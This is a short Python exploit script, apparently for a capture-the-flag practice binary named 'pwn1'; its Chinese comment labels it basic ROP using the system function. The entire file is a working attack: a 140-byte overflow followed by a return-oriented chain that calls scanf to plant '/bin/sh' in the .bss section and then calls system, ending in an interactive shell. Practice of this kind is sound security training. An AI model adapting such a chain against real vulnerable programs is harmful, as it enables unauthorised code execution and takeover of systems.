# 基础ROP，有system函数

from zio import *
from pwn import *

io = zio('./pwn1')

exe = elf.ELF('./pwn1')
bss_addr = exe.bss()
scanf_addr = exe.plt['__isoc99_scanf']
system_addr = exe.plt['system']

ret = 0x8048436
popret = 0x804844d
pop2ret = 0x80487ad
pop3ret = 0x804882d
pop4ret = 0x804882c
leaveret = 0x8048568
addesp_12 = 0x804844a
addesp_44 = 0x8048829
addesp_156 = 0x80487a7

_s = 0x0804888F

buf = 'A'*140 + p32(scanf_addr) + p32(pop2ret) + p32(_s) + p32(bss_addr) + p32(system_addr) + p32(0xdeadbeef) + p32(bss_addr)

io.read_until_timeout()
io.writeline(buf)
io.read_until_timeout()
io.writeline('1')
io.read_until_timeout()
io.writeline('/bin/sh')
io.read_until_timeout()
io.interact()

